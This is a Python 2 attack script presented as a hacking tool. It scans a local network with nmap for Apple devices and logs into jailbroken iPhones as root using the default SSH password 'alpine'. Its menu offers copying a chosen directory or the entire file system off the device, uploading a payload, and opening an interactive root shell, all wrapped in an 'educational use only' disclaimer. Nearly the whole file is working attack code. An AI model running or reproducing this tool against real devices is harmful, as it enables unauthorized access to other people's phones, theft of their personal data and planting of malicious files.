#!/usr/bin/python

## Python Script search out Apple products and attempt to SSH with default credentials.

import os
import netifaces as ni
import pexpect
from logging import root
from os.path import expanduser
import sys
import re
import socket
from IPy import IP

os.system('clear')
print """yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdyoo++oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdsoo++++hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhsooooooyMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhyoooooymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhsssyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhhyyyhhdmNMMMMMMMMNNmmdhhhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhysysssssssssyhdmmdysoo++oooooooshdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhysssssssssssooossoooosssssooooo++++oshNMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhysssssssssssssssssssssssssssssssyyyyssoooNMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMNmhysssssyyyyyyyyyyyyyyssyyyyyyyyyhdddhyysosdMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMhssssssyyyyyyyyyyyyyyyyyyyyyyyyyhdmddhyysodMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMyooossyyyyhhhhhhhhhhhhhhhhhhhhhhdmmmdhyys+mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMm+oosssyyhhhhhhhhhhhhhhhhhhhhhhhmNmmddhys+dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMo+oossyyyhhhhhhhhhhhhhhhhhhhhhdNNNmmdhhys/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMM++oossyyhhhhhhhhhddddddddddddmNNNNmmddhys/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMM/+oossyyhhhhhhhdddddddddddddNNNNNNmmddhys/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMo/+ossyyhhhhhdddddddddddddmNNNNNNNmmmdhyy+yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMh:+oosyyhhhhdddddddddddddmNNNNNNNNmmmdhhys/dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMN:+oossyhhhhdddddddddddmNNNNNNNNNNNmmmdhhys+hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMs/+oosyyhhhhdddddddddmNNNNNNNNNNNNmmmddhhysosmMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMN//+ossyyhhhdddddddmNNNNNNNNNNNNNNmmmmddhhyysoohNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMd:/+ossyhhhhddddmNNNNNNNNNNNNNNNmmmmmdddhhyyso/NMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMh:/+ossyhhhhddmNNmmmmmmmmmmmmmmmmmmdddhyysssodMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMy///+osyyhddmmmmmmmmmmmmmmmmmmmdddhhyysoossdMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh///+oyyhddddddddddhhhhhhddddddhhhyssooshmMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmo//+osyhhhhhhhyyyyyyyyyyyhhhhyyyssoosdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNh/:/+osyyyyyssssssssssssyyyyysssooymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs/:/+ooooo+/++++++++/+ooosooo+oyNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy+////++shmmNNMNNmdyo+///++smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmNMMMMMMMMMMMMMMMMmmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
"""
print "\n\n"
print """This code is designed to exploit the default credentials of a jailbroken iDevice.  You will
have the ability to copy files or directories, upload files, or create a SSH connection as root.  
Note that depending on the size of the network you are scanning the Nmap scan may take awhile to complete.  
Following the Nmap scan a list of suspected iDevices will be listed by IPv4 address.  You may input any IPv4 
address at this point.  This is done so that you may target a known device that may not appear on the initial scan.  
As always this tool is for educational use only and I accept no responsibility for its misuse.

Happy Hacking ~ 7109node"""
print "\n"
raw_input("press ENTER to continue")

def main():
    global scanRange
    global outfile
    global finaltarget
    banner()
    getInt()
    getTargets()
    getIP()
    preCheck()
    selectAttack()
    
def banner():
    os.system('clear')
    print """yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdyoo++oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdsoo++++hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhsooooooyMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhyoooooymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhsssyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhhyyyhhdmNMMMMMMMMNNmmdhhhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhysysssssssssyhdmmdysoo++oooooooshdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhysssssssssssooossoooosssssooooo++++oshNMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhysssssssssssssssssssssssssssssssyyyyssoooNMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMNmhysssssyyyyyyyyyyyyyyssyyyyyyyyyhdddhyysosdMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMhssssssyyyyyyyyyyyyyyyyyyyyyyyyyhdmddhyysodMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMyooossyyyyhhhhhhhhhhhhhhhhhhhhhhdmmmdhyys+mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMm+oosssyyhhhhhhhhhhhhhhhhhhhhhhhmNmmddhys+dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMo+oossyyyhhhhhhhhhhhhhhhhhhhhhdNNNmmdhhys/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMM++oossyyhhhhhhhhhddddddddddddmNNNNmmddhys/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMM/+oossyyhhhhhhhdddddddddddddNNNNNNmmddhys/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMo/+ossyyhhhhhdddddddddddddmNNNNNNNmmmdhyy+yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMh:+oosyyhhhhdddddddddddddmNNNNNNNNmmmdhhys/dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMN:+oossyhhhhdddddddddddmNNNNNNNNNNNmmmdhhys+hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMs/+oosyyhhhhdddddddddmNNNNNNNNNNNNmmmddhhysosmMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMN//+ossyyhhhdddddddmNNNNNNNNNNNNNNmmmmddhhyysoohNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMd:/+ossyhhhhddddmNNNNNNNNNNNNNNNmmmmmdddhhyyso/NMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMh:/+ossyhhhhddmNNmmmmmmmmmmmmmmmmmmdddhyysssodMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMy///+osyyhddmmmmmmmmmmmmmmmmmmmdddhhyysoossdMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh///+oyyhddddddddddhhhhhhddddddhhhyssooshmMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmo//+osyhhhhhhhyyyyyyyyyyyhhhhyyyssoosdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNh/:/+osyyyyyssssssssssssyyyyysssooymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs/:/+ooooo+/++++++++/+ooosooo+oyNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy+////++shmmNNMNNmdyo+///++smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmNMMMMMMMMMMMMMMMMmmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"""


    
def getInt():
    global scanRange
    global exclude


    print "\n"
    print "\n|"
    print "Below are your local interfaces \n"
    print ni.interfaces()
    print "\n"
    iface = raw_input("Please select the interface connected to the target LAN:  ")
    ni.ifaddresses(iface)
    ip = ni.ifaddresses(iface)[2][0]['addr']
    scanRange = ip + "/24"
    exclude = ip
    os.system('clear')
    print "You have choosen to scan the" + " " + scanRange + " " + "network"
    os.system(' sleep 3')
             
def getTargets():
#Scan the selected network for a target Apple device.
    
    print "Scanning" + " " + scanRange +" " +" for target devices." 
    os.system('sleep 2')
    os.system('clear')
    print "Now Running Nmap on Target Network."
    prog = "nmap -p 62078 --exclude " + exclude + " " + scanRange + " > /tmp/nmap" 
    os.system(prog)
    print "Parsing results to filter Apple Devices"
    parse = "grep -i '62078/tcp open' -B 3 /tmp/nmap > /tmp/targets"
    os.system(parse)
    os.system('clear')
       
def getIP():
    global outfile
    global finaltarget
    print "Possible targets are listed below, please select from the following IP addresses.\n"
    if os.stat("/tmp/targets").st_size == 0:
        print "No valid targets found on this network."
        os.system('sleep 2')
        loopMe()
    else:    
        try:
            file = open("/tmp/targets", "r")
            ips = []
            for text in file.readlines():
                text = text.rstrip()
                regex = re.findall(r'(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})$',text)
                if regex is not None and regex not in ips:
                    ips.append(regex)

            for ip in ips:
                outfile = open("/tmp/ios_devices", "a")
                addy = "".join(ip)
                if addy is not '':
                    print "%s" % (addy)
                    outfile.write(addy)
                    outfile.write("\n")
        finally:
            file.close()
            outfile.close()
    finaltarget = raw_input("Please input Target IP here: ")
    
   
    while True:
        try:
            IP(finaltarget)
        except ValueError:
            # Not a valid number
            print finaltarget +" is not a valid IPv4 address."
            finaltarget = raw_input("Please input Target IP here: ")
        else:
            # No error; stop the loop
            break

def preCheck():
    host = finaltarget
    port = 22
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    os.system('clear')
    print "Performing Prechecks, please wait."
    print "\n"
    try:
        s.connect((host, port))
        s.shutdown(2)
        print "Connecting to: "
        print host + " on port " + str(port) + " was successful."
    except:
        print "Connecting to: "
        print host + " on port: " + str(port) + " was unsuccessful."
        
    print "\nWould you like to continue the attack against " + finaltarget +"?"
    yes = set(['yes','y', 'ye', ''])
    no = set(['no','n'])
    print "\n"
    choice = raw_input("Please type yes or no: ").lower()
    if choice in yes:
        selectAttack()
    if choice in no:
        os.system('clear')
        getIP()
        preCheck()       
    else:
        os.system('clear')
        preCheck()

def selectAttack():
    os.system('clear')
    print "Please select from the following options:"
    print "\n"
    print "1: Connect to " + finaltarget + " and download specific directory."
    print "2: Connect to " + finaltarget + " and download the complete file system:"
    print "3: Connect to " + finaltarget + " and upload a payload:"
    print "4: Open a SSH connection to " + finaltarget
    print "\n"
    choice = raw_input("Enter 1, 2, 3, or 4:")
    solution1 = set(['1'])
    solution2 = set(['2'])
    solution3 = set(['3'])
    solution4 = set(['4'])
    if choice in solution1:
       downloadFile()     
    elif choice in solution2:
        downloadAll()            
    elif choice in solution3:
        upload()
    elif choice in solution4:
        sshConnect()     
    else:
        sys.stdout.write("Please select 1, 2, 3, or 4:")
        os.system('clear')
        selectAttack()

def downloadFile():
    dir = "/usr/var/real_apple/" + finaltarget
    if not os.path.exists(dir):
        os.makedirs(dir)
    os.system('clear')
    print "You are targeting " + finaltarget
    print "\n"
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    target_dir = raw_input("Enter the absolute path of the target directory:")
    filename=target_dir
    child = pexpect.spawn("scp -r -C -o stricthostkeychecking=no %s@%s:%s %s" % (username, user_host, filename, dir), timeout=30000)
    child.logfile_read = sys.stdout
    child.expect(".*ssword: ")
    child.sendline(user_pass)
    child.expect(pexpect.EOF)
    
    
    print '\n Your files are stored in \n ' + dir + " ."
    os.system('sleep 3')
    os.system('clear')
    loopMe()
    
def downloadAll():
    dir = "/usr/var/real_apple/" + finaltarget
    if not os.path.exists(dir):
        os.makedirs(dir)
    os.system('clear')
    print "You are targeting " + finaltarget
    print "\n"
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    
    filename="/"
    child = pexpect.spawn("scp -r -C -o stricthostkeychecking=no %s@%s:%s %s" % (username, user_host, filename, dir), timeout=30000)
    child.logfile_read = sys.stdout
    child.expect(".*ssword: ")
    child.sendline(user_pass)
    child.expect(pexpect.EOF)
    
    print '\n Your files are stored in /usr/var/real_apple/' + finaltarget
    os.system('sleep 3')
    os.system('clear')
    loopMe()
   
def upload():
    print "You are targeting " + finaltarget
    print "\n"
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    upload_file = raw_input("Enter the absolute path of the file you wish to upload:")
    target_dir = raw_input("Enter the absolute path to the upload location:")
    
    filename= upload_file
    child = pexpect.spawn("scp %s %s@%s:%s" % (upload_file, username, user_host, target_dir), timeout=30000)
    child.logfile_read = sys.stdout
    child.expect(".*ssword: ")
    child.sendline(user_pass)
    child.expect(pexpect.EOF)
        
    print '\n Your file has been uploaded to' + target_dir
    os.system('sleep 3')
    os.system('clear')
    loopMe()
    
def sshConnect():
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    ssh_newkey = 'Are you sure you want to continue connecting'
    p=pexpect.spawn('ssh -o stricthostkeychecking=no %s@%s' % (username, user_host))
    i=p.expect(['.*assword:',pexpect.EOF,pexpect.TIMEOUT],1)
    if i==0:
        print "Passing credentials:",
        p.sendline(user_pass)
    elif i==1:
        print "I either got key or connection timeout"
        pass
    elif i==2: #timeout
        pass
    p.sendline("\r")
    global global_pexpect_instance
    global_pexpect_instance = p
    try:
        p.interact()
        os.system('sleep 1')
        loopMe()
    except:
        loopMe()
    
def cleanUp():
    os.remove("/tmp/ios_devices")
    os.remove("/tmp/nmap")
    os.remove("/tmp/targets")
    sys.exit(0)
    
def loopMe():
    os.system('clear')
    print """Run again?"""
    yes = set(['yes','y', 'ye', ''])
    no = set(['no','n'])

    choice = raw_input("Type yes or no: ").lower()
    if choice in yes:
        main()
    elif choice in no:
        sys.exit(0)
        if os.path.exists("/tmp/ios_devices"):
            cleanUp()
        else:
            sys.exit(0)
    else:
        #sys.stdout.write("Please respond with 'yes' or 'no'\n")
        print "Please type yes or no only."
        os.system('sleep 2')
        loopMe()
    
    
if __name__ == "__main__":
    main()
